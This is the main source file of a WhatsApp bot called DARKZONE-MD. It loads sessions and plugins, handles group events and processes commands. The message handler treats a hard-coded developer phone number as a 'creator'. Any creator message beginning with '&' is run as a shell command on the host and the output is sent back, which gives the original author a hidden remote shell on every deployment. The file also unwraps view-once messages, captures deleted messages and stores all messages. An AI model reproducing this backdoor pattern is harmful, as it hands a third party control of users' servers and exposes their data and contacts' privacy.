const axios = require('axios');
const config = require('./config');
const {
    default: makeWASocket,
    useMultiFileAuthState,
    DisconnectReason,
    jidNormalizedUser,
    getContentType,
    proto,
    generateForwardMessageContent,
    generateWAMessageFromContent,
    prepareWAMessageMedia,
    downloadContentFromMessage,
    jidDecode,
    fetchLatestBaileysVersion,
    Browsers
} = require(config.BAILEYS);

const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson } = require('./lib/functions');
const { saveMessage } = require('./data');
const fs = require('fs');
const P = require('pino');
const { PresenceControl, BotActivityFilter } = require('./data/presence');
const { sms, downloadMediaMessage, AntiDelete } = require('./lib');
const FileType = require('file-type');
const { File } = require('megajs');
const os = require('os');
const path = require('path');
const prefix = config.PREFIX;
const ownerNumber = ['923306137477'];

// Temp directory setup
const tempDir = path.join(os.tmpdir(), 'cache-temp');
if (!fs.existsSync(tempDir)) {
    fs.mkdirSync(tempDir);
}

const clearTempDir = () => {
    try {
        fs.readdirSync(tempDir).forEach(file => {
            fs.unlinkSync(path.join(tempDir, file));
        });
    } catch (e) {}
};

setInterval(clearTempDir, 5 * 60 * 1000);

const express = require("express");
const app = express();
const port = process.env.PORT || 9090;

// Session handling
const sessionDir = path.join(__dirname, 'sessions');
const credsPath = path.join(sessionDir, 'creds.json');

if (!fs.existsSync(sessionDir)) {
    fs.mkdirSync(sessionDir, { recursive: true });
}

async function loadSession() {
    try {
        if (!config.SESSION_ID) {
            console.log('No SESSION_ID provided - QR login will be generated');
            return null;
        }

        console.log('[⏳] Downloading session...');
        
        const megaFileId = config.SESSION_ID.startsWith('IK~') 
            ? config.SESSION_ID.replace("IK~", "") 
            : config.SESSION_ID;

        const filer = File.fromURL(`https://mega.nz/file/${megaFileId}`);
            
        const data = await new Promise((resolve, reject) => {
            filer.download((err, data) => {
                if (err) reject(err);
                else resolve(data);
            });
        });
        
        fs.writeFileSync(credsPath, data);
        console.log('[✅] Session downloaded successfully');
        return JSON.parse(data.toString());
    } catch (error) {
        console.error('❌ Error loading session:', error.message);
        return null;
    }
}

async function connectToWA() {
    console.log("[🔰] DARKZONE-MD Connecting to WhatsApp ⏳️...");
    
    const creds = await loadSession();
    
    const { state, saveCreds } = await useMultiFileAuthState(path.join(__dirname, 'sessions'));
    
    const { version } = await fetchLatestBaileysVersion();
    
    const conn = makeWASocket({
        logger: P({ level: 'silent' }),
        printQRInTerminal: !creds,
        browser: Browsers.macOS("Firefox"),
        syncFullHistory: true,
        auth: state,
        version,
        getMessage: async () => ({})
    });

    // ==================== CONNECTION HANDLER ====================
    conn.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect, qr } = update;
        
        if (connection === 'close') {
            if (lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut) {
                console.log('[🔰] Connection lost, reconnecting...');
                setTimeout(connectToWA, 5000);
            } else {
                console.log('[🔰] Connection closed, please change session ID');
            }
        } else if (connection === 'open') {
            console.log('[🔰] DARKZONE-MD connected to WhatsApp ✅');
            
            // Load plugins
            const pluginPath = path.join(__dirname, 'plugins');
            let pluginCount = 0;
            
            try {
                fs.readdirSync(pluginPath).forEach((plugin) => {
                    if (path.extname(plugin).toLowerCase() === ".js") {
                        require(path.join(pluginPath, plugin));
                        pluginCount++;
                    }
                });
                console.log(`[🔰] ${pluginCount} Plugins installed successfully ✅`);
            } catch (e) {
                console.log('[⚠️] Error loading plugins:', e.message);
            }

            // Send connection message
            try {
                const botName = config.BOT_NAME || 'DARKZONE-MD';
                const ownerName = config.OWNER_NAME || 'Owner';
                
                const connectMessage = `╭━━━━━━━━━━━━━━━━━━━╮
┃  🤖 *${botName} STARTED*
┃━━━━━━━━━━━━━━━━━━━━
┃ ✅ *Status:* _Online & Ready_
┃ 📡 *Connection:* _Successful_
┃ 🔌 *Plugins:* _${pluginCount} Loaded_
╰━━━━━━━━━━━━━━━━━━━╯

╭━━〔 ⚙️ *Bot Info* 〕━━━╮
┃ ▸ *Prefix:* ${prefix}
┃ ▸ *Bot:* ${botName}
┃ ▸ *Owner:* ${ownerName}
┃ ▸ *Mode:* ${config.MODE || 'public'}
╰━━━━━━━━━━━━━━━━━━━╯

🎉 *All systems operational!*
⏰ *Started at:* ${new Date().toLocaleString()}

⭐ *Channel:* https://whatsapp.com/channel/0029Vb5dDVO59PwTnL86j13J
⭐ *GitHub:* https://github.com/ERFAN-Md/DARKZONE-MD/fork`;

                await conn.sendMessage(conn.user.id, { 
                    image: { url: config.MENU_IMAGE_URL || 'https://files.catbox.moe/jecbfo.jpg' }, 
                    caption: connectMessage,
                    contextInfo: {
                        forwardingScore: 999,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterName: botName,
                            newsletterJid: "120363416743041101@newsletter",
                        }
                    }
                });
                
                console.log('[🔰] Connect message sent successfully ✅');
            } catch (e) {
                console.log('[⚠️] Error sending connect message:', e.message);
            }
        }

        if (qr) {
            console.log('[🔰] Scan the QR code to connect or use session ID');
        }
    });

    conn.ev.on('creds.update', saveCreds);

    // ==================== ANTI-DELETE HANDLER ====================
    conn.ev.on('messages.update', async updates => {
        try {
            for (const update of updates) {
                if (update.update.message === null) {
                    console.log("[🗑️] Delete Detected");
                    await AntiDelete(conn, updates);
                }
            }
        } catch (e) {}
    });

    // ==================== ANTI-CALL HANDLER ====================
    conn.ev.on('call', async (calls) => {
        try {
            if (config.ANTI_CALL !== 'true') return;

            for (const call of calls) {
                if (call.status !== 'offer') continue;

                await conn.rejectCall(call.id, call.from);
                await conn.sendMessage(call.from, {
                    text: config.REJECT_MSG || '*Sorry, calls are not allowed.*'
                });
                console.log(`[📵] Call rejected from: ${call.from.split('@')[0]}`);
            }
        } catch (e) {}
    });

    // ==================== WELCOME & GOODBYE HANDLER ====================
    conn.ev.on('group-participants.update', async (update) => {
        try {
            if (config.WELCOME !== "true") return;

            const metadata = await conn.groupMetadata(update.id);
            const groupName = metadata.subject;
            const groupSize = metadata.participants.length;
            const timestamp = new Date().toLocaleString();
            const botName = config.BOT_NAME || 'DARKZONE-MD';

            for (let user of update.participants) {
                const userName = user.split('@')[0];
                let pfp;

                try {
                    pfp = await conn.profilePictureUrl(user, 'image');
                } catch (err) {
                    pfp = config.MENU_IMAGE_URL || "https://files.catbox.moe/jecbfo.jpg";
                }

                // WELCOME
                if (update.action === 'add') {
                    const welcomeMsg = `╭━━━━〔 *𝗪𝗘𝗟𝗖𝗢𝗠𝗘* 〕━━━━╮
┃
┃ 👋 *Hello* @${userName}!
┃ 
┃ 📍 *Group:* ${groupName}
┃ 👥 *Members:* ${groupSize}
┃ ⏰ *Joined:* ${timestamp}
┃
┃ 📜 Please read the group rules
┃ 🤝 Be respectful to everyone
┃
╰━━━ *${botName}* ━━━╯`;

                    await conn.sendMessage(update.id, {
                        image: { url: pfp },
                        caption: welcomeMsg,
                        mentions: [user],
                        contextInfo: {
                            forwardingScore: 999,
                            isForwarded: true,
                            mentionedJid: [user],
                            forwardedNewsletterMessageInfo: {
                                newsletterName: botName,
                                newsletterJid: "120363416743041101@newsletter",
                            },
                        }
                    });
                }

                // GOODBYE
                if (update.action === 'remove') {
                    const goodbyeMsg = `╭━━━━〔 *𝗚𝗢𝗢𝗗𝗕𝗬𝗘* 〕━━━━╮
┃
┃ 👋 @${userName} left the group
┃ 
┃ 📍 *Group:* ${groupName}
┃ 👥 *Remaining:* ${groupSize}
┃ ⏰ *Left:* ${timestamp}
┃
╰━━━ *${botName}* ━━━╯`;

                    await conn.sendMessage(update.id, {
                        image: { url: config.MENU_IMAGE_URL || "https://files.catbox.moe/jecbfo.jpg" },
                        caption: goodbyeMsg,
                        mentions: [user],
                        contextInfo: {
                            forwardingScore: 999,
                            isForwarded: true,
                            mentionedJid: [user],
                            forwardedNewsletterMessageInfo: {
                                newsletterName: botName,
                                newsletterJid: "120363416743041101@newsletter",
                            },
                        }
                    });
                }

                // PROMOTE
                if (update.action === "promote" && config.ADMIN_ACTION === "true") {
                    const promoter = update.author ? update.author.split("@")[0] : 'Unknown';
                    await conn.sendMessage(update.id, {
                        text: `╭━━〔 🎉 *PROMOTED* 〕━━╮
┃
┃ 👑 @${userName} is now Admin!
┃ 👤 *By:* @${promoter}
┃ 📍 *Group:* ${groupName}
┃ ⏰ *Time:* ${timestamp}
┃
╰━━━ *${botName}* ━━━╯`,
                        mentions: [update.author, user]
                    });
                }
                
                // DEMOTE
                if (update.action === "demote" && config.ADMIN_ACTION === "true") {
                    const demoter = update.author ? update.author.split("@")[0] : 'Unknown';
                    await conn.sendMessage(update.id, {
                        text: `╭━━〔 ⚠️ *DEMOTED* 〕━━╮
┃
┃ 📉 @${userName} is no longer Admin
┃ 👤 *By:* @${demoter}
┃ 📍 *Group:* ${groupName}
┃ ⏰ *Time:* ${timestamp}
┃
╰━━━ *${botName}* ━━━╯`,
                        mentions: [update.author, user]
                    });
                }
            }
        } catch (err) {
            console.error("❌ Error in welcome/goodbye:", err.message);
        }
    });

    // Presence control
    conn.ev.on("presence.update", (update) => PresenceControl(conn, update));
    BotActivityFilter(conn);

    // ==================== MESSAGE HANDLER ====================
    conn.ev.on('messages.upsert', async (mek) => {
        try {
            mek = mek.messages[0];
            if (!mek.message) return;
            
            mek.message = (getContentType(mek.message) === 'ephemeralMessage') 
                ? mek.message.ephemeralMessage.message 
                : mek.message;

            // Read message if enabled
            if (config.READ_MESSAGE === 'true') {
                await conn.readMessages([mek.key]);
            }

            if (mek.message.viewOnceMessageV2) {
                mek.message = mek.message.viewOnceMessageV2.message;
            }

            // ==================== STATUS VIEW ====================
            if (mek.key && mek.key.remoteJid === 'status@broadcast') {
                // Auto Status Seen
                if (config.AUTO_STATUS_SEEN === "true") {
                    await conn.readMessages([mek.key]);
                    console.log(`[👁️] Viewed status from: ${mek.key.participant?.split('@')[0]}`);
                }

                // ==================== STATUS REACT ====================
                if (config.AUTO_STATUS_REACT === "true") {
                    const statusEmojis = ["🔥", "💯", "❤️", "😍", "👏", "🎉", "💪", "✨", "🌟", "💫", "🙌", "👍", "💜", "💙", "💚", "💛", "🧡", "🖤", "🤍", "💖"];
                    const randomEmoji = statusEmojis[Math.floor(Math.random() * statusEmojis.length)];
                    
                    try {
                        await conn.sendMessage(mek.key.remoteJid, {
                            react: {
                                text: randomEmoji,
                                key: mek.key
                            }
                        }, { statusJidList: [mek.key.participant] });
                        console.log(`[⭐] Reacted to status with: ${randomEmoji}`);
                    } catch (e) {
                        console.log('[⚠️] Status react error:', e.message);
                    }
                }

                // Auto Status Reply
                if (config.AUTO_STATUS_REPLY === "true") {
                    const user = mek.key.participant;
                    const replyMsg = config.AUTO_STATUS_MSG || "Nice Status! 🔥";
                    
                    await sleep(2000);
                    
                    try {
                        await conn.sendMessage(user, { 
                            text: replyMsg,
                            react: { text: '💜', key: mek.key }
                        }, { quoted: mek });
                        console.log(`[💬] Replied to status from: ${user?.split('@')[0]}`);
                    } catch (e) {}
                }
            }

            // Newsletter react
            const newsletterJids = ["120363416743041101@newsletter"];
            const emojis = ["🎉", "👍", "🔥", "💀", "❤️", "🎀", "🪄", "🎐", "🧸", "💸"];

            if (mek.key && newsletterJids.includes(mek.key.remoteJid)) {
                try {
                    const serverId = mek.newsletterServerId;
                    if (serverId) {
                        const emoji = emojis[Math.floor(Math.random() * emojis.length)];
                        await conn.newsletterReactMessage(mek.key.remoteJid, serverId.toString(), emoji);
                    }
                } catch (e) {}
            }

            // Save message
            try {
                await saveMessage(mek);
            } catch (e) {}

            const m = sms(conn, mek);
            const type = getContentType(mek.message);
            const from = mek.key.remoteJid;
            const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo != null 
                ? mek.message.extendedTextMessage.contextInfo.quotedMessage || [] 
                : [];
            const body = (type === 'conversation') ? mek.message.conversation 
                : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text 
                : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption 
                : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption 
                : '';
            
            const isCmd = body.startsWith(prefix);
            const budy = typeof mek.text == 'string' ? mek.text : false;
            const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
            const args = body.trim().split(/ +/).slice(1);
            const q = args.join(' ');
            const text = args.join(' ');
            const isGroup = from.endsWith('@g.us');
            const sender = mek.key.fromMe ? (conn.user.id.split(':')[0]+'@s.whatsapp.net' || conn.user.id) : (mek.key.participant || mek.key.remoteJid);
            const senderNumber = sender.split('@')[0];
            const botNumber = conn.user.id.split(':')[0];
            const pushname = mek.pushName || 'User';
            const isMe = botNumber.includes(senderNumber);
            const isOwner = ownerNumber.includes(senderNumber) || isMe;
            const botNumber2 = await jidNormalizedUser(conn.user.id);
            const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => {}) : '';
            const groupName = isGroup ? groupMetadata.subject : '';
            const participants = isGroup ? await groupMetadata.participants : '';
            const groupAdmins = isGroup ? await getGroupAdmins(participants) : '';
            const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false;
            const isAdmins = isGroup ? groupAdmins.includes(sender) : false;
            const isReact = m.message.reactionMessage ? true : false;
            
            const reply = (teks) => {
                conn.sendMessage(from, { text: teks }, { quoted: mek });
            };

            // Creator check
            const udp = botNumber.split('@')[0];
            const jawadop = ('923306137477', '923306137477');
            let ownerFilev2 = [];
            try {
                ownerFilev2 = JSON.parse(fs.readFileSync('./assets/sudo.json', 'utf-8'));
            } catch (e) {}
            
            let isCreator = [udp, ...String(jawadop).split(','), config.DEV + '@s.whatsapp.net', ...ownerFilev2]
                .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net') 
                .includes(sender);

            // Terminal command for creator
            if (isCreator && mek.text && mek.text.startsWith("&")) {
                let code = budy.slice(2);
                if (!code) {
                    reply(`Provide me with a query to run Master!`);
                    return;
                }
                const { spawn } = require("child_process");
                try {
                    let resultTest = spawn(code, { shell: true });
                    resultTest.stdout.on("data", data => reply(data.toString()));
                    resultTest.stderr.on("data", data => reply(data.toString()));
                    resultTest.on("error", data => reply(data.toString()));
                    resultTest.on("close", code => {
                        if (code !== 0) reply(`command exited with code ${code}`);
                    });
                } catch (err) {
                    reply(require('util').format(err));
                }
                return;
            }

            // Owner react
            if (senderNumber.includes("923306137477") && !isReact) {
                const reactions = ["👑", "🦢", "❤️", "🫜", "💎", "🔥", "💫"];
                m.react(reactions[Math.floor(Math.random() * reactions.length)]);
            }

            // Auto React
            if (!isReact && config.AUTO_REACT === 'true') {
                const reactions = ['🌼', '❤️', '💐', '🔥', '🏵️', '❄️', '💥', '🥀', '❤‍🔥', '🫶', '👻', '💸', '🎀', '🪄', '🧸'];
                m.react(reactions[Math.floor(Math.random() * reactions.length)]);
            }

            // Owner React
            if (!isReact && config.OWNER_REACT === 'true' && senderNumber === botNumber) {
                const reactions = ['👑', '🦢', '❤️', '💎', '🔥', '💫', '🌸'];
                m.react(reactions[Math.floor(Math.random() * reactions.length)]);
            }

            // Custom React
            if (!isReact && config.CUSTOM_REACT === 'true') {
                const reactions = (config.CUSTOM_REACT_EMOJIS || '🥲,😂,👍🏻').split(',');
                m.react(reactions[Math.floor(Math.random() * reactions.length)]);
            }

            // Ban check
            let bannedUsers = [];
            try {
                bannedUsers = JSON.parse(fs.readFileSync('./assets/ban.json', 'utf-8'));
            } catch (e) {}
            if (bannedUsers.includes(sender)) return;

            // Owner check
            let ownerFile = [];
            try {
                ownerFile = JSON.parse(fs.readFileSync('./assets/sudo.json', 'utf-8'));
            } catch (e) {}
            const ownerNumberFormatted = `${config.OWNER_NUMBER}@s.whatsapp.net`;
            const isFileOwner = ownerFile.includes(sender);
            const isRealOwner = sender === ownerNumberFormatted || isMe || isFileOwner;

            // Mode checks
            if (!isRealOwner && config.MODE === "private") return;
            if (!isRealOwner && isGroup && config.MODE === "inbox") return;
            if (!isRealOwner && !isGroup && config.MODE === "groups") return;

            // Command handler
            const events = require('./command');
            const cmdName = isCmd ? body.slice(1).trim().split(" ")[0].toLowerCase() : false;
            
            if (isCmd) {
                const cmd = events.commands.find((cmd) => cmd.pattern === cmdName) || 
                           events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName));
                
                if (cmd) {
                    if (cmd.react) conn.sendMessage(from, { react: { text: cmd.react, key: mek.key }});
                    
                    try {
                        cmd.function(conn, mek, m, {
                            from, quoted, body, isCmd, command, args, q, text, isGroup, 
                            sender, senderNumber, botNumber2, botNumber, pushname, 
                            isMe, isOwner, isCreator, groupMetadata, groupName, participants, 
                            groupAdmins, isBotAdmins, isAdmins, reply
                        });
                    } catch (e) {
                        console.error("[PLUGIN ERROR]", e);
                    }
                }
            }

            // Event-based commands
            events.commands.forEach(async (command) => {
                if (body && command.on === "body") {
                    command.function(conn, mek, m, {
                        from, quoted, body, isCmd, command, args, q, text, isGroup,
                        sender, senderNumber, botNumber2, botNumber, pushname,
                        isMe, isOwner, isCreator, groupMetadata, groupName, participants,
                        groupAdmins, isBotAdmins, isAdmins, reply
                    });
                } else if (mek.q && command.on === "text") {
                    command.function(conn, mek, m, {
                        from, quoted, body, isCmd, command, args, q, text, isGroup,
                        sender, senderNumber, botNumber2, botNumber, pushname,
                        isMe, isOwner, isCreator, groupMetadata, groupName, participants,
                        groupAdmins, isBotAdmins, isAdmins, reply
                    });
                } else if ((command.on === "image" || command.on === "photo") && mek.type === "imageMessage") {
                    command.function(conn, mek, m, {
                        from, quoted, body, isCmd, command, args, q, text, isGroup,
                        sender, senderNumber, botNumber2, botNumber, pushname,
                        isMe, isOwner, isCreator, groupMetadata, groupName, participants,
                        groupAdmins, isBotAdmins, isAdmins, reply
                    });
                } else if (command.on === "sticker" && mek.type === "stickerMessage") {
                    command.function(conn, mek, m, {
                        from, quoted, body, isCmd, command, args, q, text, isGroup,
                        sender, senderNumber, botNumber2, botNumber, pushname,
                        isMe, isOwner, isCreator, groupMetadata, groupName, participants,
                        groupAdmins, isBotAdmins, isAdmins, reply
                    });
                }
            });
        } catch (e) {
            console.error('[MESSAGE ERROR]', e.message);
        }
    });

    // ==================== HELPER FUNCTIONS ====================
    conn.decodeJid = jid => {
        if (!jid) return jid;
        if (/:\d+@/gi.test(jid)) {
            let decode = jidDecode(jid) || {};
            return (decode.user && decode.server && decode.user + '@' + decode.server) || jid;
        }
        return jid;
    };

    conn.sendText = (jid, text, quoted = '', options) => 
        conn.sendMessage(jid, { text: text, ...options }, { quoted });

    conn.sendImage = async (jid, path, caption = '', quoted = '', options) => {
        let buffer = Buffer.isBuffer(path) ? path : 
            /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split`,`[1], 'base64') : 
            /^https?:\/\//.test(path) ? await getBuffer(path) : 
            fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0);
        return await conn.sendMessage(jid, { image: buffer, caption: caption, ...options }, { quoted });
    };

    conn.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
        try {
            let res = await axios.head(url);
            let mime = res.headers['content-type'];
            
            if (mime.split("/")[1] === "gif") {
                return conn.sendMessage(jid, { video: await getBuffer(url), caption, gifPlayback: true, ...options }, { quoted, ...options });
            }
            if (mime === "application/pdf") {
                return conn.sendMessage(jid, { document: await getBuffer(url), mimetype: 'application/pdf', caption, ...options }, { quoted, ...options });
            }
            if (mime.split("/")[0] === "image") {
                return conn.sendMessage(jid, { image: await getBuffer(url), caption, ...options }, { quoted, ...options });
            }
            if (mime.split("/")[0] === "video") {
                return conn.sendMessage(jid, { video: await getBuffer(url), caption, mimetype: 'video/mp4', ...options }, { quoted, ...options });
            }
            if (mime.split("/")[0] === "audio") {
                return conn.sendMessage(jid, { audio: await getBuffer(url), caption, mimetype: 'audio/mpeg', ...options }, { quoted, ...options });
            }
        } catch (e) {}
    };

    conn.downloadMediaMessage = async (message) => {
        try {
            let mime = (message.msg || message).mimetype || '';
            let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0];
            const stream = await downloadContentFromMessage(message, messageType);
            let buffer = Buffer.from([]);
            for await (const chunk of stream) {
                buffer = Buffer.concat([buffer, chunk]);
            }
            return buffer;
        } catch (e) {
            return null;
        }
    };

    conn.parseMention = async (text) => {
        return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net');
    };

    conn.sendTextWithMentions = async (jid, text, quoted, options = {}) => 
        conn.sendMessage(jid, { 
            text: text, 
            contextInfo: { 
                mentionedJid: [...text.matchAll(/@(\d{0,16})/g)].map(v => v[1] + '@s.whatsapp.net') 
            }, 
            ...options 
        }, { quoted });

    conn.copyNForward = async(jid, message, forceForward = false, options = {}) => {
        let vtype;
        if (options.readViewOnce) {
            message.message = message.message && message.message.ephemeralMessage && message.message.ephemeralMessage.message ? message.message.ephemeralMessage.message : (message.message || undefined);
            vtype = Object.keys(message.message.viewOnceMessage.message)[0];
            delete(message.message && message.message.ignore ? message.message.ignore : (message.message || undefined));
            delete message.message.viewOnceMessage.message[vtype].viewOnce;
            message.message = { ...message.message.viewOnceMessage.message };
        }

        let mtype = Object.keys(message.message)[0];
        let content = await generateForwardMessageContent(message, forceForward);
        let ctype = Object.keys(content)[0];
        let context = {};
        if (mtype != "conversation") context = message.message[mtype].contextInfo;
        content[ctype].contextInfo = { ...context, ...content[ctype].contextInfo };
        const waMessage = await generateWAMessageFromContent(jid, content, options ? {
            ...content[ctype],
            ...options,
            ...(options.contextInfo ? {
                contextInfo: { ...content[ctype].contextInfo, ...options.contextInfo }
            } : {})
        } : {});
        await conn.relayMessage(jid, waMessage.message, { messageId: waMessage.key.id });
        return waMessage;
    };

    conn.serializeM = mek => sms(conn, mek);
}

// Express server
app.use(express.static(path.join(__dirname, 'lib')));

app.get('/', (req, res) => {
    res.send("DARKZONE-MD Bot is running ✅");
});

app.listen(port, () => console.log(`Server listening on http://localhost:${port}`));

setTimeout(() => {
    connectToWA();
}, 4000);
